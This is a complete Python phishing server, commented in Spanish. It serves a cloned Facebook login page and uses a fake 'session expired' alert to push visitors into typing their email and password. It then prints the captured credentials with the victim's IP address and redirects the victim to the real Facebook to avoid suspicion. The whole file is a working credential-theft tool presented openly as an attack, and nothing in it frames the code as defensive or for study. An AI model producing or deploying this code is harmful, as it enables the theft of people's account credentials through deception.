from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import time

# CONFIGURACIÓN
HOST_NAME = "0.0.0.0"
PORT_NUMBER = 80

# AQUÍ PEGAMOS TU HTML DEL LOGIN FALSO
# Nota: He asegurado que el form action apunte a este mismo servidor
LOGIN_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Facebook</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-container { display: flex; align-items: center; justify-content: space-between; max-width: 1000px; width: 100%; padding: 20px; }
        .fb-text { max-width: 500px; margin-right: 50px; }
        .fb-text h1 { color: #1877f2; font-size: 56px; font-weight: bold; margin: 0 0 10px 0; }
        .fb-text p { font-size: 28px; line-height: 32px; font-weight: normal; margin: 0; }
        .login-box { background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; width: 350px; text-align: center; }
        input { width: 90%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
        .btn-login { background-color: #1877f2; border: none; border-radius: 6px; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; color: #fff; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background-color .2s; }
        .btn-login:hover { background-color: #166fe5; }
        .forgot { display: block; margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .btn-new { background-color: #42b72a; border: none; border-radius: 6px; font-size: 17px; line-height: 48px; padding: 0 16px; color: #fff; font-weight: bold; cursor: pointer; }
        @media (max-width: 800px) { .fb-text { display: none; } .login-container { justify-content: center; } }
    </style>
</head>
<body>
    <img src="x" style="display:none;" onerror="alert('Su sesión ha caducado. Por seguridad, por favor inicie sesión nuevamente.');">
    
    <div class="login-container">
        <div class="fb-text">
            <h1>facebook</h1>
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="login-box">
            <form action="/" method="POST">
                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
                <input type="password" name="pass" placeholder="Contraseña" required>
                <button type="submit" class="btn-login">Iniciar sesión</button>
            </form>
            <a href="#" class="forgot">¿Has olvidado la contraseña?</a>
            <div class="divider"></div>
            <button class="btn-new">Crear cuenta nueva</button>
        </div>
    </div>
</body>
</html>
"""

class PhishingHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """Si la víctima llega redirigida (GET), le mostramos el Login Falso"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(bytes(LOGIN_HTML, "utf-8"))

    def do_POST(self):
        """Si la víctima envía el formulario (POST), capturamos los datos"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print("\n" + "="*50)
        print(f"[+] ¡CREDENCIALES CAPTURADAS! - {time.ctime()}")
        print(f"[+] IP Víctima: {self.client_address[0]}")
        print("-" * 50)
        
        # Intentar limpiar los datos para que se vean bonitos
        try:
            parsed = urllib.parse.parse_qs(post_data)
            email = parsed.get('email', [''])[0]
            password = parsed.get('pass', [''])[0]
            print(f"USUARIO: {email}")
            print(f"PASSWORD: {password}")
        except:
            print(f"Datos crudos: {post_data}")
            
        print("="*50 + "\n")

        # Redirigir al Facebook real para despistar
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()

if __name__ == '__main__':
    httpd = HTTPServer((HOST_NAME, PORT_NUMBER), PhishingHandler)
    print(f"[*] Servidor Kali escuchando en {HOST_NAME}:{PORT_NUMBER}")
    print("[*] Esperando a que lleguen las víctimas...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.server_close()
        print("\n[*] Servidor detenido.")